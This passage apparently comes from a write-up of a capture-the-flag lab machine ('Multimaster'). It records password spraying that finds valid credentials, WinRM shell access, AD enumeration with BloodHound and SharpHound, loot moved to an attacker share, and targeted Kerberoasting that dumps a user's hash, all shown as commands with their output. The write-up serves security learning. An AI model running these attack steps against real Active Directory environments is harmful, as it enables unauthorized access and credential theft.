SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Key Admins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\krbtgt:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\MULTIMASTER$:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\pmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Privileged IT Accounts:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Protected Users:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\RAS and IAS Servers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Read-only Domain Controllers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Schema Admins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\SQLServer2005SQLBrowserUser$MULTIMASTER:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-sql:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\test:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
                                    
```

The ` [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!` is work

```autohotkey
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto 10.129.95.200  -u 'sbauer' -p 'D3veL0pM3nT!'; done
```

```
┌──(root㉿kali)-[~/Desktop]
└─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto 10.129.95.200  -u 'sbauer' -p 'D3veL0pM3nT!'; done

[*] Testing smb...
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                                                  
SMB         10.129.95.200   445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 

[*] Testing winrm...
WINRM       10.129.95.200   5985   MULTIMASTER      [*] Windows 10 / Server 2016 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.200   5985   MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! (Pwn3d!)

[*] Testing wmi...
RPC         10.129.95.200   135    MULTIMASTER      [*] Windows 10 / Server 2016 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
RPC         10.129.95.200   135    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 

[*] Testing rdp...
[-] Schema mismatch detected for table 'hosts' in protocol 'RDP'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /root/.nxc/workspaces/default/rdp.db ~/nxc_rdp.bak`)
[-] Then remove the RDP DB (`rm -f /root/.nxc/workspaces/default/rdp.db`) and run nxc to initialize the new DB

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.95.200   389    MULTIMASTER      [*] Windows 10 / Server 2016 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:None) (channel binding:No TLS cert)                                                                                                                                                                    
LDAP        10.129.95.200   389    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 

[*] Testing mssql...
[-] Schema mismatch detected for table 'loggedin_relations' in protocol 'MSSQL'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /root/.nxc/workspaces/default/mssql.db ~/nxc_mssql.bak`)
[-] Then remove the MSSQL DB (`rm -f /root/.nxc/workspaces/default/mssql.db`) and run nxc to initialize the new DB

[*] Testing ftp...

```

The ldap and wmi , i can also in , here is the very import step , you should spent time to get the root by go in the wmi or use the bloodhound to collect the data

for me , i should enum and do the next , if i cannot have any hint from bloodhound , then i will try to go in the wmi

```
┌──(root㉿kali)-[~/Desktop]
└─# bloodhound-ce-python -u sbauer -p 'D3veL0pM3nT!' -k -d MEGACORP.LOCAL  -ns  10.129.95.200   -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: megacorp.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::4160:79cb:5a05:8165
INFO: Trying LDAP connection to dead:beef::4160:79cb:5a05:8165
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::4160:79cb:5a05:8165
INFO: Trying LDAP connection to dead:beef::4160:79cb:5a05:8165
INFO: Found 28 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
INFO: Done in 00M 53S
INFO: Compressing output into 20260514225720_bloodhound.zip                                                 
                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# 


```

```
┌──(root㉿kali)-[~/Desktop]
└─# wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.7/rusthound-ce-Linux-gnu-x86_64.tar.gz
--2026-05-14 22:58:30--  https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.7/rusthound-ce-Linux-gnu-x86_64.tar.gz
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/864158232/f6218d98-6581-466b-a6c6-82368e216a04?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-15T03%3A48%3A59Z&rscd=attachment%3B+filename%3Drusthound-ce-Linux-gnu-x86_64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-15T02%3A48%3A59Z&ske=2026-05-15T03%3A48%3A59Z&sks=b&skv=2018-11-09&sig=pargK2aHWC%2Fmgu%2BggZq%2BYGAemDQT%2FbCgeo8LpjOSOFw%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODgxNDIxMSwibmJmIjoxNzc4ODEzOTExLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.tys23WuGklCSwBQRMJsbXemY_jl3UtLtD5PmxBaOPqg&response-content-disposition=attachment%3B%20filename%3Drusthound-ce-Linux-gnu-x86_64.tar.gz&response-content-type=application%2Foctet-stream [following]
--2026-05-14 22:58:31--  https://release-assets.githubusercontent.com/github-production-release-asset/864158232/f6218d98-6581-466b-a6c6-82368e216a04?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-15T03%3A48%3A59Z&rscd=attachment%3B+filename%3Drusthound-ce-Linux-gnu-x86_64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-15T02%3A48%3A59Z&ske=2026-05-15T03%3A48%3A59Z&sks=b&skv=2018-11-09&sig=pargK2aHWC%2Fmgu%2BggZq%2BYGAemDQT%2FbCgeo8LpjOSOFw%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODgxNDIxMSwibmJmIjoxNzc4ODEzOTExLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.tys23WuGklCSwBQRMJsbXemY_jl3UtLtD5PmxBaOPqg&response-content-disposition=attachment%3B%20filename%3Drusthound-ce-Linux-gnu-x86_64.tar.gz&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4131872 (3.9M) [application/octet-stream]
Saving to: ‘rusthound-ce-Linux-gnu-x86_64.tar.gz’

rusthound-ce-Linux-gnu-x86_64.tar.g 100%[=================================================================>]   3.94M  16.6MB/s    in 0.2s    

2026-05-14 22:58:32 (16.6 MB/s) - ‘rusthound-ce-Linux-gnu-x86_64.tar.gz’ saved [4131872/4131872]

                                                                                                                             
┌──(root㉿kali)-[~/Desktop]
└─# tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
README.md
rusthound-ce
                        
```

```
┌──(root㉿kali)-[~/Desktop]
└─# ./rusthound-ce --domain MEGACORP.LOCAL  -u sbauer  -p 'D3veL0pM3nT!' --zip
---------------------------------------------------
Initializing RustHound-CE at 22:59:40 on 05/14/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-15T02:59:40Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-15T02:59:40Z INFO  rusthound_ce] Collection method: All
[2026-05-15T02:59:41Z INFO  rusthound_ce::ldap] Connected to MEGACORP.LOCAL Active Directory!
[2026-05-15T02:59:41Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-15T02:59:41Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-15T02:59:43Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=MEGACORP,DC=LOCAL
[2026-05-15T02:59:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-15T02:59:49Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=MEGACORP,DC=LOCAL
[2026-05-15T02:59:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-15T02:59:55Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
[2026-05-15T02:59:55Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-15T02:59:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL
[2026-05-15T02:59:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-15T02:59:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL
[2026-05-15T02:59:56Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-05-15T02:59:56Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-05-15T02:59:56Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 28 users parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] 77 containers parsed!
[2026-05-15T02:59:56Z INFO  rusthound_ce::json::maker::common] .//20260514225956_megacorp-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 22:59:56 on 05/14/26! Happy Graphing!
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-GenericWrite" >}} That method is effective in owned shell  ,with setting active-directory 's user Jorden attribute to DoesNotRequirePreAuth in owned shell of Sberuser, we can use the GetNPUsers.py to dump the Jorden 's hash if we can see the genericwrite in the bloodhound.

{{< /toggle >}}

![Pasted image 20260515112000.png](/ob/Pasted%20image%2020260515112000.png)

i can increase my attack path

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# evil-winrm -u 'MEGACORP\sbauer' -p 'D3veL0pM3nT!' -i 10.129.95.200
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sbauer\Documents> 

```

```
copy \\10.10.14.45\share\SharpHound.exe C:\ProgramData\SharpHound.exe
```

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> copy \\10.10.14.45\share\SharpHound.exe C:\ProgramData\SharpHound.exe
```

```
*Evil-WinRM* PS C:\ProgramData> .\SharpHound.exe -c all
2026-05-14T20:51:15.1386503-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-05-14T20:51:15.1586491-07:00|INFORMATION|SharpHound Version: 2.12.0.0
2026-05-14T20:51:15.1586491-07:00|INFORMATION|SharpHound Common Version: 4.6.1.0
2026-05-14T20:51:15.2824070-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-05-14T20:51:15.2980312-07:00|INFORMATION|Initializing SharpHound at 8:51 PM on 5/14/2026
2026-05-14T20:51:15.3449088-07:00|INFORMATION|Resolved current domain to MEGACORP.LOCAL
2026-05-14T20:51:15.4699112-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-05-14T20:51:15.5480325-07:00|INFORMATION|Beginning LDAP search for MEGACORP.LOCAL
2026-05-14T20:51:15.5480325-07:00|INFORMATION|Collecting AdminSDHolder data for MEGACORP.LOCAL
2026-05-14T20:51:15.6145958-07:00|INFORMATION|AdminSDHolder ACL hash 46225A8B0A8A4A3E5432AEC486327207AAE5BBA8 calculated for MEGACORP.LOCAL.
2026-05-14T20:51:15.7176006-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7186014-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7286027-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7296023-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7326026-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7386028-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7396031-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7406035-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7436021-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7436021-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7456029-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7482883-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:15.7639071-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2326614-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2639102-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.2795352-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MEGACORP.LOCAL
2026-05-14T20:51:16.5295349-07:00|INFORMATION|Beginning LDAP search for MEGACORP.LOCAL Configuration NC
2026-05-14T20:51:17.2413189-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-05-14T20:51:17.2433180-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-05-14T20:51:22.6487092-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-05-14T20:51:22.6647103-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-05-14T20:51:22.7968920-07:00|INFORMATION|Status: 335 objects finished (+335 47.85714)/s -- Using 67 MB RAM
2026-05-14T20:51:22.7968920-07:00|INFORMATION|Enumeration finished in 00:00:07.2583775
2026-05-14T20:51:22.8750188-07:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-05-14T20:51:22.8906455-07:00|INFORMATION|SharpHound Enumeration Completed at 8:51 PM on 5/14/2026! Happy Graphing!

```

```
*Evil-WinRM* PS C:\ProgramData> ls


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:23 AM                Comms
d---s-         1/9/2020   1:18 PM                Microsoft
d-----        7/19/2021   1:07 AM                Package Cache
d-----        9/25/2019  10:54 AM                regid.1991-06.com.microsoft
d-----        7/16/2016   6:23 AM                SoftwareDistribution
d-----       11/20/2016   5:15 PM                USOPrivate
d-----       11/20/2016   5:15 PM                USOShared
da----        7/19/2021   1:07 AM                VMware
d-----         1/7/2020   7:45 PM                VsTelemetry
-a----        5/14/2026   8:51 PM          33951 20260514205117_BloodHound.zip
-a----        10/7/2019   1:06 PM         259584 cefdebug.exe
-a----         3/3/2023   5:15 AM          59392 nc.exe
-a----        5/14/2026   7:28 PM          38616 nc32.exe
-a----        5/14/2026   7:24 PM             16 proof.txt
-a----         4/9/2026   9:37 AM        1351680 SharpHound.exe
-a----        5/14/2026   8:51 PM           1492 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin


*Evil-WinRM* PS C:\ProgramData> move 20260514205117_BloodHound.zip  \\10.10.14.45\share\
 
*Evil-WinRM* PS C:\ProgramData> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-GenericWrite" >}} That method is effective in owned shell  ,with setting active-directory 's user Jorden attribute to DoesNotRequirePreAuth with \$true in owned shell of Sberuser, we can use the GetNPUsers.py to dump the Jorden 's hash if we can see the genericwrite in the bloodhound.

{{< /toggle >}}

![Pasted image 20260515112000.png](/ob/Pasted%20image%2020260515112000.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "KRB5KRB\_AP\_ERR\_SKEW" >}} The sync worked (`+423s` stepped) but Kerberos still complains. A few things to check:  the problem is Clock skew too great , but can solve it by timedatectl set-ntp false due toptimedatectl NTP is fighting your sync back

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# timedatectl set-ntp false
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# ntpdate 10.129.95.200
2026-05-15 02:03:18.255124 (-0400) +423.975964 +/- 0.096872 10.129.95.200 s1 no-leap
CLOCK: time stepped by 423.975964
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/targetedKerberoast]
└─# ./targetedKerberoast.py -d 'MEGACORP.LOCAL' -u sbauer -p 'D3veL0pM3nT!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (jorden)
$krb5tgs$23$*jorden$MEGACORP.LOCAL$MEGACORP.LOCAL/jorden*$5cf7a917baa333bbfed969dfbfe01aec$dd5d8251d01f4ff48bd63235757a14e3787e787c840373f0fe3b77ec6bfafae9e226c7c438dc70b48affc9d604abbb0c01543a2f09ef69f8921b5ecb47efc57dd77fed62e069a82b34f4c74b0d94656a8953134f05083875843f5007a6a585312075cb1b9addc81a1571f1ca30ffa1709a3d6eb9fe0e7d2cba9b80f77d983bc17ac486206f9f52a2605fe51f637166f631c3f08e6b9d4fa9b201b0a8f58cbb1959f44186a8a652bec77e513b53ec87102762c0a0afacc9335c7f97991bb6e4207315f6187a589cb54a2623a4bfe255ab1bbf0cf69a9987f7d52debefa4e4b8dee3f2e059684c8fe08876fde18ae2ae217d464b38577799154558da4ed17e89e44d286713136a304421620cf91ad5a795bbb1e994c8f6d9d612e6a138b6e907d10228ec1b9a54056052c4ef3066445825a6887de1ecacc88d524adf3552aef5b254b2d538bcfe0bb040d0df2b2caebf02085cfa2c0df9b96119ad964faadbc05a262ad5f8ccc35ec29e410373389ffc7cb6ef9294c849037b91ab237fc0f1d789c593c8b81737fc0a679a57c590515badbb89815df8e753b96ced6a90767aa41044a61719fc677eb2f7e5bbf565237ecbe922896144b972f70c5f3f07fe7782aeb84177325190242741d57b34cf98d3e2b1589ec17298f6adcb7c55d883f1309816f364e98b037484460cb2b6d820d7a106bc0315f594d9cb62470ddef416cd20e52d4ae57b694c0b9b60cafe13bea15a9f2de3c1f17470bb10ac7ed0b9235be05c02db59668aa7c7afc7e5ca2a8899885c68488fe6b41df9d3b16eaa1093964ef5a89cfa9ed7e198f68333ec5bfb7e8a783645b40735825f3c736e13f0a4a29f6e93e3fe8646af534746c523c3a3a6ee8250c765dcbc46e599ee2e11c49cf8b0c75f6a719665817d3c2dd5ce11040426f74e2e0240bcbf05b3c3ecf871729b9783f12a9b279b069e7d0dab0a33732b7530db6199a32be85b4b1e5cd7cd7e7a34610eda3a5b0967c3c6434d408babcd2b3729d4a23c2fd4ead6be58c9205dadc95ab1070f9617af98eeceabe02ea4898a9d937821c5d9ae7b22bd54042c782bc5d6e2fbd60dbd2f0554720a7be5ecdcf6f75a581aeabf8b072816be13aa88c5ad7b6a32203b8d25f363fe7aef9b5af969670fff2254682792bddff0dbae9b09f1e03dbe5d4028de556b5a7373c9c321afb849575d5518225602b6a3804809f6b80f46bc2645fd5c3f17365a674d02865b38ddf7832743a1a07a90e486845311de89990cae74850b3d8b38ae0e5b95c0519dabc2d235346a345a00750329774c7f1899d190345a2cf63970515032043237487acbb85cb9d52e331eea26c76ac6420570e2071764e8a61b8a40c19d

```

